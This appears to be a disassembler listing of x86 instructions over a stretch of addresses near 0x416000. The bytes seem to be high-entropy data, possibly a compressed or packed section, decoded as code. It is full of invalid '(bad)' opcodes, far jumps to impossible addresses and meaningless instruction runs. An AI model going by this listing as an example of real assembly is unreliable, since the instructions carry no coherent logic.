  415f0c:	xchg   ebx,eax
  415f0d:	das    
  415f0e:	js     0x415f70
  415f10:	pop    ecx
  415f11:	cwde   
  415f12:	or     ch,BYTE PTR [esi]
  415f14:	pop    edx
  415f15:	(bad)  
  415f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f17:	or     DWORD PTR [esi+0x46],0xc8f5ad89
  415f1e:	jno    0x415f02
  415f20:	in     al,0x27
  415f22:	cmp    bl,BYTE PTR [edx]
  415f24:	out    0xce,al
  415f26:	push   esp
  415f27:	aad    0x36
  415f29:	add    eax,0x28591d84
  415f2e:	adc    al,cl
  415f30:	xchg   edx,eax
  415f31:	sbb    esi,DWORD PTR [ecx-0x16b8ac90]
  415f37:	jp     0x415ebc
  415f39:	jmp    FWORD PTR [edi+0x1b775c9]
  415f3f:	pop    edx
  415f40:	xchg   ebx,eax
  415f41:	jmp    0x415ec9
  415f43:	mov    ebx,0xc828af12
  415f48:	or     eax,0xb57948c0
  415f4d:	fnsave ds:0xb8494d7b
  415f53:	jmp    FWORD PTR [eax]
  415f55:	xchg   edx,eax
  415f56:	adc    al,0x3d
  415f58:	mov    dh,0xaf
  415f5a:	cli    
  415f5b:	rcr    esi,cl
  415f5d:	fdivr  DWORD PTR [ecx+0x57]
  415f60:	cld    
  415f61:	(bad)  
  415f62:	test   DWORD PTR [ecx-0x2d],0xfeef133e
  415f69:	dec    edi
  415f6a:	sub    esp,DWORD PTR [esi]
  415f6c:	jle    0x415f82
  415f6e:	inc    esp
  415f6f:	lahf   
  415f70:	mov    ss,WORD PTR [ebx]
  415f72:	stc    
  415f73:	jp     0x415fb3
  415f75:	not    DWORD PTR [edi+0x70]
  415f78:	jmp    0x415f17
  415f7a:	adc    BYTE PTR [ecx*4-0x2ce6fedb],cl
  415f81:	(bad)  
  415f82:	cmp    BYTE PTR [ecx],ah
  415f84:	mov    ds:0x58ec6159,al
  415f89:	idiv   DWORD PTR [eax]
  415f8b:	xchg   ecx,eax
  415f8c:	or     bl,bl
  415f8e:	sbb    al,0xed
  415f90:	push   ebx
  415f91:	lock pop ds
  415f93:	aam    0xd3
  415f95:	cmp    al,0x88
  415f97:	xor    DWORD PTR [ecx+0x27fe8b47],ecx
  415f9d:	dec    esi
  415f9e:	push   0xffffff8c
  415fa0:	sbb    BYTE PTR [ebx+0x20de30ed],al
  415fa6:	lock iret 
  415fa8:	sub    eax,0xea1905b5
  415fad:	mov    edx,0xf5e711e2
  415fb2:	jbe    0x41601b
  415fb4:	push   esp
  415fb5:	scas   al,BYTE PTR es:[edi]
  415fb6:	repz inc eax
  415fb8:	push   0xffffff9b
  415fba:	fiadd  WORD PTR [eax]
  415fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fbd:	jne    0x415f97
  415fbf:	xchg   ecx,eax
  415fc0:	in     eax,0xf1
  415fc2:	pop    esi
  415fc3:	scas   al,BYTE PTR es:[edi]
  415fc4:	mov    al,0x2f
  415fc6:	in     al,dx
  415fc7:	mov    al,ds:0x1485efb1
  415fcc:	cwde   
  415fcd:	dec    edi
  415fce:	xor    ah,BYTE PTR [edx+eax*8+0x20]
  415fd2:	dec    ebp
  415fd3:	push   ecx
  415fd4:	mov    al,BYTE PTR [edi-0xcf2b1d4]
  415fda:	and    bh,dh
  415fdc:	adc    ecx,edx
  415fde:	stc    
  415fdf:	cdq    
  415fe0:	inc    esi
  415fe1:	push   eax
  415fe2:	dec    esp
  415fe3:	mov    WORD PTR [eax+ecx*2],ss
  415fe6:	push   edx
  415fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe8:	dec    ebx
  415fe9:	add    al,0x8b
  415feb:	inc    edx
  415fec:	cmp    esi,esi
  415fee:	xor    BYTE PTR [ebx],bl
  415ff0:	dec    esp
  415ff1:	fcompp 
  415ff3:	jno    0x416016
  415ff5:	clc    
  415ff6:	sub    eax,DWORD PTR [edx]
  415ff8:	fsub   QWORD PTR [ebp+0x6f3fabf9]
  415ffe:	xchg   ecx,eax
  415fff:	push   ecx
  416000:	cld    
  416001:	je     0x415fe3
  416003:	xchg   ebp,eax
  416004:	fld    DWORD PTR [edx-0x2a]
  416007:	jns    0x415fbc
  416009:	push   ecx
  41600a:	push   cs
  41600b:	ss dec esp
  41600d:	or     ch,BYTE PTR [esi+0x6a4ebd4f]
  416013:	sbb    cl,BYTE PTR [ebx-0x6a]
  416016:	xchg   BYTE PTR [esi-0x30],bh
  416019:	inc    ebp
  41601a:	push   edx
  41601b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41601c:	mov    ebp,0x602dd4d9
  416021:	jns    0x416001
  416023:	push   ebx
  416024:	test   ecx,ebp
  416026:	idiv   DWORD PTR [ebp+0x50]
  416029:	jmp    0x34f602a3
  41602e:	fwait
  41602f:	cld    
  416030:	jge    0x416039
  416032:	popf   
  416033:	outs   dx,DWORD PTR ds:[esi]
  416034:	fsub   QWORD PTR [edx-0x4fa3d568]
  41603a:	mov    dh,0x57
  41603c:	lock jp 0x416029
  41603f:	jns    0x416096
  416041:	add    ecx,DWORD PTR [ecx+eiz*4+0x33ba4df8]
  416048:	cs push edi
  41604a:	mov    eax,ds:0x28d50bbd
  41604f:	in     al,dx
  416050:	push   esi
  416051:	jl     0x415ffd
  416053:	mov    ebp,0xfdde2665
  416058:	xor    BYTE PTR [esi],0x4a
  41605b:	mov    bh,0xb5
  41605d:	lock push cs
  41605f:	mov    ebx,0x48068120
  416064:	fmul   QWORD PTR [edi-0x3f]
  416067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416068:	sub    BYTE PTR [esp+ebx*2],ch
  41606b:	inc    esi
  41606c:	das    
  41606d:	das    
  41606e:	test   DWORD PTR [eax+0x7b63c2dd],eax
  416074:	cdq    
  416075:	pop    ecx
  416076:	cmp    eax,0xadbb2560
  41607b:	xchg   ebx,eax
  41607c:	add    ebx,ebx
  41607e:	dec    edi
  41607f:	popf   
  416080:	jbe    0x4160fb
  416082:	pop    ebp
  416083:	(bad)  
  416084:	sub    DWORD PTR gs:[edx+eiz*4],ebx
  416088:	test   eax,ebx
  41608a:	xor    eax,0x4718432d
  41608f:	lods   eax,DWORD PTR ds:[esi]
  416090:	mov    dh,0xf5
  416092:	adc    dh,0xc9
  416095:	sub    dl,BYTE PTR [ecx]
  416097:	dec    esp
  416098:	mov    ?,WORD PTR [ecx-0x67]
  41609b:	push   cs
  41609c:	test   bh,al
  41609e:	push   eax
  41609f:	jb     0x41609b
  4160a1:	mov    ch,0x6c
  4160a3:	mov    eax,DWORD PTR [ebp+0x263634c9]
  4160a9:	das    
  4160aa:	clc    
  4160ab:	inc    eax
  4160ac:	out    dx,al
  4160ad:	loop   0x416051
  4160af:	xor    ebx,DWORD PTR [ebx-0x15d994cc]
  4160b5:	mov    cl,0xf6
  4160b7:	xor    al,0x20
  4160b9:	and    edi,DWORD PTR [eax]
  4160bb:	cmp    BYTE PTR [edi],bh
  4160bd:	mov    WORD PTR [edi+0x63fac1f3],cs
  4160c3:	scas   eax,DWORD PTR es:[edi]
  4160c4:	or     dl,BYTE PTR [ebx-0x71]
  4160c7:	ss cdq 
  4160c9:	jns    0x4160c5
  4160cb:	mov    bh,0x89
  4160cd:	fdivr  DWORD PTR [esi]
  4160cf:	and    dl,al
  4160d1:	mov    dl,0x14
  4160d3:	fiadd  DWORD PTR [ebp+0xe]
  4160d6:	or     ecx,DWORD PTR [ebx+eax*8]
  4160d9:	dec    edx
  4160da:	cmp    bh,BYTE PTR [edx]
  4160dc:	(bad)
  4160e0:	mov    ah,0x92
  4160e2:	and    DWORD PTR [ecx+esi*2-0x773e53da],0x53ba7ded
  4160ed:	xor    ebx,DWORD PTR [ebx-0x3018573f]
  4160f3:	add    ch,bh
  4160f5:	adc    eax,0x25cec37d
  4160fa:	push   esi
  4160fb:	mov    ah,0xae
  4160fd:	mov    edi,0x1802f49c
  416102:	push   edi
  416103:	jno    0x416124
  416105:	pushf  
  416106:	dec    ecx
  416107:	push   cs
  416108:	xchg   DWORD PTR [edx+esi*4+0x5e],esi
  41610c:	sbb    DWORD PTR [edi+0x7b166585],ecx
  416112:	mov    bl,0x55
  416114:	add    bl,al
  416116:	pop    eax
  416117:	das    
  416118:	inc    edx
  416119:	retf   0x1ce2
  41611c:	pop    ds
  41611d:	(bad)  
  41611e:	adc    BYTE PTR [eax+0x32f7bfa3],ah
  416124:	xchg   BYTE PTR [edi],ch
  416126:	inc    eax
  416127:	or     esi,DWORD PTR [ebx]
  416129:	xchg   edx,eax
  41612a:	(bad)
  41612d:	mov    ebx,0x16c6b78
  416132:	add    BYTE PTR [ebp-0x5d7da582],dh
  416138:	mov    esi,0x220385bd
  41613d:	ror    DWORD PTR ss:[ebp-0x1673d3d2],cl
  416144:	shr    DWORD PTR [esi+0x37],cl
  416147:	xor    al,0xf0
  416149:	push   esi
  41614a:	mov    bl,0x49
  41614c:	xlat   BYTE PTR ds:[ebx]
  41614d:	add    DWORD PTR [edx+0x68a663f5],edx
  416153:	jge    0x41610e
  416155:	(bad)  
  416156:	daa    
  416157:	fwait
  416158:	cli    
  416159:	fcom   st(0)
  41615b:	(bad)  
  41615c:	cli    
  41615d:	aam    0x8d
  41615f:	mov    esp,0x1ed45280
  416164:	pop    es
  416165:	arpl   WORD PTR [edi-0x2c37285e],di
  41616b:	dec    ebp
  41616c:	push   ebp
  41616d:	mov    DWORD PTR [eax-0x2e10ce08],esi
  416173:	data16 das 
  416175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416176:	dec    ecx
  416177:	test   BYTE PTR [edx],0x3
  41617a:	jne    0x416114
  41617c:	je     0x41618a
  41617e:	and    DWORD PTR [ebp-0x3a],0xfffffffa
  416182:	fwait
  416183:	xchg   edi,eax
  416184:	pusha  
  416185:	jle    0x416169
  416187:	mov    edi,0x90845782
  41618c:	cmp    DWORD PTR [eax+0x3b66ab55],edx
  416192:	int    0xe7
  416194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416195:	call   FWORD PTR [esi+0x65]
  416198:	loope  0x4161e8
  41619a:	jg     0x4161c3
  41619c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41619d:	mov    ch,0x6e
  41619f:	sub    eax,0x90e8226c
  4161a4:	xor    BYTE PTR [edx+edi*4+0xa],0xe6
  4161a9:	stc    
  4161aa:	stos   DWORD PTR es:[edi],eax
  4161ab:	mov    ds:0x8723744b,al
  4161b0:	inc    esi
  4161b1:	cmp    ch,dl
  4161b3:	(bad)  
  4161b4:	xchg   edx,eax
  4161b5:	icebp  
  4161b6:	popa   
  4161b7:	xchg   ebp,eax
  4161b8:	retf   0x19d5
  4161bb:	add    DWORD PTR [eax+0x7e],eax
  4161be:	xor    al,0xa6
  4161c0:	inc    eax
  4161c1:	xor    al,0xa6
  4161c3:	shr    BYTE PTR [ecx],0xfc
  4161c6:	ret    
  4161c7:	(bad)  
  4161c8:	mov    esp,gs
  4161ca:	jae    0x41618a
  4161cc:	jecxz  0x4161d4
  4161ce:	push   ecx
  4161cf:	xchg   DWORD PTR [ebp-0x76],esp
  4161d2:	xchg   BYTE PTR [edx],bl
  4161d4:	mov    dl,0x24
  4161d6:	ds pusha 
  4161d8:	out    dx,eax
  4161d9:	sub    ebp,DWORD PTR [eax-0x72]
  4161dc:	jo     0x4161f4
  4161de:	fidiv  WORD PTR [ebp+0x4d]
  4161e1:	(bad)  
  4161e2:	jg     0x416250
  4161e4:	dec    ebp
  4161e5:	mov    DWORD PTR [ebp+0x738bda5c],esi
  4161eb:	mov    cl,0xef
  4161ed:	sti    
  4161ee:	sub    al,0x5d
  4161f0:	sub    ebx,ebp
  4161f2:	ror    edx,cl
  4161f4:	add    BYTE PTR [ebx-0x37198a48],ah
  4161fa:	clc    
  4161fb:	add    esi,DWORD PTR [edi]
  4161fd:	shr    DWORD PTR [esi+0x73],1
  416200:	jne    0x4161e6
  416202:	xchg   esi,eax
  416203:	jge    0x4161b5
  416205:	out    dx,eax
  416206:	enter  0x1708,0x8a
  41620a:	jge    0x416276
  41620c:	shl    DWORD PTR ds:[eax-0x78fbd89],1
  416213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416214:	fcom   st(0)
  416216:	in     eax,0xea
  416218:	das    
  416219:	daa    
  41621a:	jecxz  0x41620d
  41621c:	cmp    dl,BYTE PTR [edi-0xf]
  41621f:	inc    edx
  416220:	popa   
  416221:	shl    BYTE PTR [edx],0xbd
  416224:	maskmovq mm6,(bad)
  416225:	div    DWORD PTR [eax]
  416227:	sbb    al,0xd0
  416229:	sub    esp,DWORD PTR [edi+0x24066fa]
  41622f:	mov    ch,0xb9
  416231:	inc    DWORD PTR [eax]
  416233:	test   al,0x66
  416235:	jne    0x4161f8
  416237:	clc    
  416238:	or     eax,0xf4a8e2fd
  41623d:	inc    edi
  41623e:	adc    BYTE PTR [esi+ebp*8],dl
  416241:	dec    eax
  416242:	xlat   BYTE PTR ds:[ebx]
  416243:	fwait
  416244:	test   BYTE PTR [edx-0x80],ah
  416247:	(bad)  [ecx+0x17]
  41624a:	fwait
  41624b:	and    al,0x37
  41624d:	jo     0x416288
  41624f:	dec    edi
  416250:	popa   
  416251:	push   edx
  416252:	iret   
  416253:	in     al,dx
  416254:	pop    ss
  416255:	mov    esi,0x666ff1b1
  41625a:	leave  
  41625b:	sahf   
  41625c:	iret   
  41625d:	pop    ecx
  41625e:	pop    edx
  41625f:	enter  0x8dea,0xed
  416263:	fdiv   QWORD PTR [ecx+0x38]
  416266:	cld    
  416267:	adc    BYTE PTR [eax+0xf59d658],cl
  41626d:	mov    eax,ds:0xd3c53cb0
  416272:	xchg   esi,eax
  416273:	call   DWORD PTR [edx-0x362cc3aa]
  41627a:	ror    BYTE PTR [ebp+edx*1+0x45],0x48
  41627f:	mov    DWORD PTR [edx-0x20e62055],ebp
  416285:	pusha  
  416286:	cdq    
  416287:	mov    edi,0x14b03ac6
  41628c:	mov    ds:0x2049d056,eax
  416291:	in     al,0xf4
  416293:	lods   eax,DWORD PTR ds:[esi]
  416294:	mov    ds:0xab0eb998,eax
  416299:	xchg   ebx,eax
  41629a:	(bad)  [edi]
  41629c:	pop    edx
  41629d:	push   ds
  41629e:	cmp    edi,DWORD PTR [esi+0x2ff16168]
  4162a4:	stos   DWORD PTR es:[edi],eax
  4162a5:	push   ebp
  4162a6:	or     eax,0xe3af9159
  4162ab:	jbe    0x4162fa
  4162ad:	and    DWORD PTR [edi],edx
  4162af:	pop    es
  4162b0:	daa    
  4162b1:	jnp    0x4162f0
  4162b3:	sub    cl,bl
  4162b5:	mov    al,ds:0xb4b716ef
  4162ba:	pop    ebx
  4162bb:	ins    BYTE PTR es:[edi],dx
  4162bc:	pop    ecx
  4162bd:	dec    edi
  4162be:	clc    
  4162bf:	mov    BYTE PTR [eax+0x1a],dl
  4162c2:	xor    eax,0x240914a8
  4162c7:	loop   0x416295
  4162c9:	pop    ebx
  4162ca:	push   edi
  4162cb:	iret   
  4162cc:	sub    eax,0x4e1da885
  4162d1:	adc    eax,0xda57f704
  4162d6:	mov    ds:0x2d519f22,al
  4162db:	dec    esi
  4162dc:	sbb    esp,edx
  4162de:	mov    ebp,DWORD PTR [edi-0x3b]
  4162e1:	test   al,0xd1
  4162e3:	fbld   TBYTE PTR [edx+0x7e]
  4162e6:	mov    cl,0xc4
  4162e8:	(bad)  [edx-0x6e]
  4162eb:	cdq    
  4162ec:	out    dx,eax
  4162ed:	pusha  
  4162ee:	sbb    al,0xb2
  4162f0:	and    eax,0x69b79f87
  4162f5:	sub    al,0x17
  4162f7:	cli    
  4162f8:	shl    BYTE PTR [ecx-0x52],0x80
  4162fc:	push   ebp
  4162fd:	xchg   esi,eax
  4162fe:	jp     0x4162b9
  416300:	ror    DWORD PTR [edx+0x29],1
  416303:	adc    al,BYTE PTR [eax-0x32]
  416306:	stos   DWORD PTR es:[edi],eax
  416307:	sbb    al,0x6e
  416309:	sbb    al,0x28
  41630b:	(bad)  
  41630c:	clc    
  41630d:	mov    ds:0x71ddd9f1,eax
  416312:	push   eax
  416313:	frstor [ebp+0x485e2862]
  416319:	nop
  41631a:	aas    
  41631b:	sbb    edx,DWORD PTR [edx]
  41631d:	xchg   esp,eax
  41631e:	ins    DWORD PTR es:[edi],dx
  41631f:	test   al,ch
  416321:	mov    BYTE PTR [esi-0x70],bl
  416324:	jmp    0x41634c
  416326:	push   0x6
  416328:	and    DWORD PTR [esi],esi
  41632a:	lods   al,BYTE PTR ds:[esi]
  41632b:	ss sub al,0x1f
  41632e:	sub    DWORD PTR [esi-0x2f],ecx
  416331:	fst    QWORD PTR [ecx-0x43214ab5]
  416337:	or     eax,0x1641448
  41633c:	or     al,0xb6
  41633e:	push   0xffffff95
  416340:	test   al,0xd7
  416342:	out    dx,eax
  416343:	dec    edx
  416344:	scas   al,BYTE PTR es:[edi]
  416345:	ss sbb eax,0x3ae94830
  41634b:	fdiv   QWORD PTR [edi+edi*2]
  41634e:	(bad)  
  41634f:	adc    ebp,DWORD PTR [ebx-0x54432079]
  416355:	lods   eax,DWORD PTR ds:[esi]
  416356:	cmp    ebp,DWORD PTR [edi+0x7b]
  416359:	pop    esp
  41635a:	lods   al,BYTE PTR ds:[esi]
  41635b:	or     bh,cl
  41635d:	adc    eax,0x9c6c5597
  416362:	sbb    DWORD PTR [edx+0x20],ebx
  416365:	inc    edi
  416366:	dec    edx
  416367:	pop    ebp
  416368:	push   ss
  416369:	push   ecx
  41636a:	mov    esp,0x3f577b49
  41636f:	inc    ebx
  416370:	out    dx,al
  416371:	clc    
  416372:	mov    eax,ds:0xf4d1f880
  416377:	lods   eax,DWORD PTR ds:[esi]
  416378:	dec    esp
  416379:	cld    
  41637a:	cs push ss
  41637c:	dec    esp
  41637d:	mov    cl,0x26
  41637f:	dec    eax
  416380:	nop
  416381:	popa   
  416382:	push   0x17
  416384:	pop    ebx
  416385:	(bad)  
  416386:	cmp    eax,0x506fe1ef
  41638b:	dec    ecx
  41638c:	mov    esp,0xe5852fe2
  416391:	mov    edi,DWORD PTR [esi-0x1c90d70e]
  416397:	sub    eax,esi
  416399:	pop    ss
  41639a:	add    esi,DWORD PTR [esi+0xfd83cda]
  4163a0:	jae    0x416332
  4163a2:	or     esp,edi
  4163a4:	or     eax,0x4d438aa0
  4163a9:	add    cl,BYTE PTR [eax]
  4163ab:	sbb    al,cl
  4163ad:	stos   DWORD PTR es:[edi],eax
  4163ae:	push   0x57020044
  4163b3:	dec    ecx
  4163b4:	(bad)  
  4163b5:	(bad)  
  4163b7:	mov    dh,BYTE PTR [ebx-0x45558ac7]
  4163bd:	popa   
  4163be:	test   BYTE PTR [ecx-0x2c],bh
  4163c1:	cli    
  4163c2:	das    
  4163c3:	mov    ebp,0x1a94c80f
  4163c8:	mov    dh,0xdc
  4163ca:	pop    ds
  4163cb:	ret    
  4163cc:	pop    ecx
  4163cd:	push   esp
  4163ce:	cmp    al,0x56
  4163d0:	mul    BYTE PTR [edi+0x6012088a]
  4163d6:	mov    dh,0xf1
  4163d8:	xchg   ebp,eax
  4163d9:	ficomp DWORD PTR [esi+esi*4]
  4163dc:	pop    ebx
  4163dd:	addr16 mov dl,0xd7
  4163e0:	gs mov bh,0x44
  4163e3:	pop    ss
  4163e4:	jns    0x4163b5
  4163e6:	fwait
  4163e7:	cmp    eax,0x26eac52c
  4163ec:	push   ebx
  4163ed:	fisttp DWORD PTR [ecx+0x75]
  4163f0:	sbb    BYTE PTR [ebx+edi*2],dl
  4163f3:	inc    ebp
  4163f4:	pop    ebx
  4163f5:	push   0xc436f027
  4163fa:	dec    esi
  4163fb:	dec    edi
  4163fc:	push   ecx
  4163fd:	pop    ebx
  4163fe:	pop    eax
  4163ff:	fcom   QWORD PTR [ecx+0x64]
  416402:	test   al,0x85
  416404:	mov    edi,0xa5b38dc5
  416409:	jmp    0xe86cce78
  41640e:	mov    BYTE PTR [esi+0x36],dh
  416411:	adc    ebx,DWORD PTR [ecx+0x6]
  416414:	mov    ecx,0x4d70821d
  416419:	cwde   
  41641a:	div    ebx
  41641c:	test   eax,0x18733ec6
  416421:	data16 daa 
  416423:	pop    ds
  416424:	dec    esp
  416425:	imul   edi,DWORD PTR [edx],0x25a846f8
  41642b:	dec    eax
  41642c:	fimul  DWORD PTR [eax]
  41642e:	fimul  DWORD PTR ds:0x24f4a54e
  416434:	mov    ebp,0xa0ad651
  416439:	xor    al,0xde
  41643b:	inc    eax
  41643c:	pop    ss
  41643d:	fwait
  41643e:	es gs push edi
  416441:	enter  0xd038,0x44
  416445:	cmc    
  416446:	mov    eax,0x16794cab
  41644b:	jo     0x4163fe
  41644d:	push   ecx
  41644e:	stc    
  41644f:	out    dx,eax
  416450:	js     0x41648c
  416452:	push   ecx
  416453:	out    0xf9,eax
  416455:	test   edx,esp
  416457:	xchg   ebp,eax
  416458:	add    esp,0xb4f1ace7
  41645e:	pop    ebp
  41645f:	imul   eax,edx,0xc467df2b
  416465:	jbe    0x41640d
  416467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416468:	mov    ah,0x95
  41646a:	retf   0xe1c9
  41646d:	gs dec esp
  41646f:	sbb    al,0x98
  416471:	and    cl,ch
  416473:	sub    al,0x7f
  416475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416476:	icebp  
  416477:	dec    ebp
  416478:	cs and ah,cl
  41647b:	aam    0x56
  41647d:	stc    
  41647e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41647f:	mov    cl,0xf3
  416481:	out    0x23,eax
  416483:	cmp    al,0xa8
  416485:	ja     0x4164db
  416487:	pop    eax
  416488:	mov    al,0x60
  41648a:	xchg   ebp,eax
  41648b:	std    
  41648c:	dec    esp
  41648d:	or     bl,bl
  41648f:	pop    ebx
  416490:	rcr    DWORD PTR [ebx-0x7031a84f],0x54
  416497:	sbb    dl,al
  416499:	jnp    0x41641b
  41649b:	leave  
  41649c:	and    DWORD PTR [eax-0x5d],0xffffffc8
  4164a0:	mov    edi,0x3b90b414
  4164a5:	icebp  
  4164a6:	inc    eax
  4164a7:	neg    DWORD PTR [ebx]
  4164a9:	repz ja 0x4164f8
  4164ac:	inc    eax
  4164ad:	xchg   BYTE PTR [esp+ecx*2+0xfb0300d],ch
  4164b4:	ret    0xc3ac
  4164b7:	sub    BYTE PTR [esi],0xe4
  4164ba:	sbb    BYTE PTR [edx-0x8ebf59a],0x69
  4164c1:	aaa    
  4164c2:	and    esp,ebx
  4164c4:	push   edi
  4164c5:	xchg   ebp,eax
  4164c6:	test   ebx,ecx
  4164c8:	pop    ecx
  4164c9:	mov    ecx,0x1336314c
  4164ce:	add    al,0x4e
  4164d0:	add    al,0x93
  4164d2:	jbe    0x41649e
  4164d4:	fnsave [ecx]
  4164d6:	out    0x96,al
  4164d8:	pop    ecx
  4164d9:	test   BYTE PTR [esp+ecx*1-0x210e02a5],bh
  4164e0:	xlat   BYTE PTR ds:[ebx]
  4164e1:	cli    
  4164e2:	and    bl,bl
  4164e4:	pop    esp
  4164e5:	pop    eax
  4164e6:	fst    QWORD PTR [edi+0x7b]
  4164e9:	arpl   WORD PTR [eax],bx
  4164eb:	loope  0x416544
  4164ed:	loope  0x4164d3
  4164ef:	aaa    
  4164f0:	push   ebx
  4164f1:	push   edx
  4164f2:	cmp    dl,BYTE PTR [edi]
  4164f4:	fucomi st,st(7)
  4164f6:	sub    ch,cl
  4164f8:	dec    edx
  4164f9:	xor    WORD PTR [ebx+eax*1],sp
  4164fd:	fdivr  st,st(6)
  4164ff:	fistp  WORD PTR ds:0xc00a1cc0
  416505:	sub    al,0x3c
  416507:	sbb    eax,0x3702b1fe
  41650c:	xchg   DWORD PTR [edi-0x5a],ecx
  41650f:	dec    dx
  416511:	cmp    al,0xf6
  416513:	scas   al,BYTE PTR es:[di]
  416515:	(bad)  [ecx-0x6]
  416518:	fbstp  TBYTE PTR [eax-0x55f193f4]
  41651e:	cmp    eax,edi
  416520:	je     0x41651d
  416522:	leave  
  416523:	pop    esi
  416524:	xchg   esp,eax
  416525:	and    bh,al
  416527:	lds    esi,FWORD PTR [ebp-0x8501be6]
  41652d:	test   bl,al
  41652f:	shl    BYTE PTR [edx],cl
  416531:	outs   dx,DWORD PTR ds:[esi]
  416532:	ror    BYTE PTR [edi+0x6a44f8ab],cl
  416538:	or     eax,0x6df741c0
  41653d:	mov    ecx,eax
  41653f:	std    
  416540:	push   ecx
  416541:	out    dx,al
  416542:	out    0x83,al
  416544:	les    eax,FWORD PTR [eax+0x4c61102a]
  41654a:	imul   ebx,DWORD PTR [ebp-0x23],0x901f9150
  416551:	test   DWORD PTR [ebx+0x5],esi
  416554:	push   es
  416555:	repnz lds ebp,FWORD PTR [edi]
  416558:	dec    edx
  416559:	out    dx,eax
  41655a:	sub    ebp,DWORD PTR [ebx]
  41655c:	dec    edi
  41655d:	jge    0x4165a7
  41655f:	repnz mov dh,0xc
  416562:	arpl   WORD PTR [ebx+esi*4],bp
  416565:	retf   
  416566:	call   0x5aba:0xc1b6bcac
  41656d:	and    BYTE PTR [edx],ah
  41656f:	jo     0x416578
  416571:	push   esi
  416572:	mov    bl,0xd
  416574:	cs das 
  416576:	(bad)  
  416577:	push   0xb631aa4
  41657c:	lock gs scas eax,DWORD PTR es:[edi]
  41657f:	pop    ds
  416580:	inc    ebp
  416581:	inc    edi
  416582:	sbb    esi,DWORD PTR [edi]
  416584:	leave  
  416585:	inc    edx
  416586:	mov    ch,0xa3
  416588:	dec    ebp
  416589:	dec    ecx
  41658a:	lea    edx,[edi+0x38]
  41658d:	pop    esp
  41658e:	fwait
  41658f:	lock lds ebp,FWORD PTR ds:0x49ef7484
  416596:	fsubr  DWORD PTR [edx]
  416598:	adc    eax,0x1e69512e
  41659d:	or     DWORD PTR [esi+ecx*2+0x70aadd8c],esp
  4165a4:	fidivr DWORD PTR [ebp-0x604a4153]
  4165aa:	xor    ecx,ecx
  4165ac:	aam    0xda
  4165ae:	popa   
  4165af:	adc    edx,eax
  4165b1:	cdq    
  4165b2:	out    dx,eax
  4165b3:	cmp    dh,BYTE PTR [esi+0xa]
  4165b6:	divps  xmm7,XMMWORD PTR [edi-0x536888c7]
  4165bd:	gs jle 0x416616
  4165c0:	ror    DWORD PTR [edi+0x5f],0x4e
  4165c4:	and    BYTE PTR [ebx+edx*1-0x4949c717],dl
  4165cb:	iret   
  4165cc:	inc    edx
  4165cd:	ins    BYTE PTR es:[edi],dx
  4165ce:	sub    DWORD PTR [ebx-0x7],edx
  4165d1:	sub    ecx,DWORD PTR [eax+0x144fdc2c]
  4165d7:	(bad)  
  4165d8:	xchg   edi,eax
  4165d9:	pop    ebp
  4165da:	(bad)  
  4165db:	jle    0x416562
  4165dd:	xor    al,0xff
  4165df:	lsl    edx,WORD PTR [ecx+0x7c]
  4165e3:	jbe    0x4165a1
  4165e5:	arpl   WORD PTR [ebx-0x54],di
  4165e8:	fs ds test al,0xf6
  4165ec:	sub    dl,BYTE PTR [eax+0x569b6c57]
  4165f2:	(bad)  
  4165f3:	mov    bh,0xb7
  4165f5:	js     0x4165fe
  4165f7:	xor    BYTE PTR [edi+0x216c648b],0x79
  4165fe:	push   edi
  4165ff:	jmp    0xeb6f:0x4364809e
  416606:	xor    al,0x35
  416608:	dec    ecx
  416609:	shl    BYTE PTR [ebp+0x5],cl
  41660c:	adc    al,0xbd
  41660e:	lods   al,BYTE PTR ds:[esi]
  41660f:	aas    
  416610:	jo     0x4165e9
  416612:	enter  0x842e,0x90
  416616:	mov    esi,edx
  416618:	mov    ds,ecx
  41661a:	adc    BYTE PTR [esp+esi*1-0x180c01da],ch
  416621:	fs pop ebx
  416623:	mov    ds:0xef807e9,al
  416628:	sbb    eax,0xe921d5f
  41662d:	push   esp
  41662e:	inc    ecx
  41662f:	fidiv  WORD PTR [eax-0x4e77f61f]
  416635:	stos   BYTE PTR es:[edi],al
  416636:	and    eax,0x79b95d19
  41663b:	mov    edi,0x3617d40
  416640:	mov    edi,esi
  416642:	jl     0x41662d
  416644:	xor    al,0x8
  416646:	call   0x84e0a86e
  41664b:	stos   BYTE PTR es:[edi],al
  41664c:	das    
  41664d:	mov    dl,0xea
  41664f:	call   0xc85b:0xd15b8e4d
  416656:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416658:	shl    DWORD PTR [ebx-0x3925b27c],1
  41665e:	fadd   st(4),st
  416660:	dec    esp
  416661:	jbe    0x4166aa
  416663:	fidiv  DWORD PTR [ebx-0x5ffce464]
  416669:	mov    eax,0x9115bd38
  41666e:	dec    esp
  41666f:	dec    edi
  416670:	cld    
  416671:	das    
  416672:	push   esi
  416673:	xchg   DWORD PTR [ebx],ebp
  416675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416676:	retf   0xbfc6
  416679:	inc    ebx
  41667a:	leave  
  41667b:	clc    
  41667c:	mov    dh,0xf2
  41667e:	daa    
  41667f:	jno    0x416689
  416681:	dec    eax
  416682:	repnz rcr edx,1
  416685:	lahf   
  416686:	add    al,bl
  416688:	into   
  416689:	mov    dh,0x61
  41668b:	mov    edx,0x5ce16af7
  416690:	arpl   WORD PTR [esi],di
  416692:	xchg   DWORD PTR [edi+edi*8-0x66],ebx
  416696:	mov    bh,0x99
  416698:	xor    BYTE PTR [ecx-0x48],cl
  41669b:	cmp    al,0x53
  41669d:	pop    edi
  41669e:	dec    ebp
  41669f:	push   edi
  4166a0:	es push 0x6f
  4166a3:	in     al,0x6c
  4166a5:	jnp    0x4166e4
  4166a7:	fcmovnbe st,st(0)
  4166a9:	dec    eax
  4166aa:	mov    cl,0xa5
  4166ac:	add    eax,0x56ac4dd4
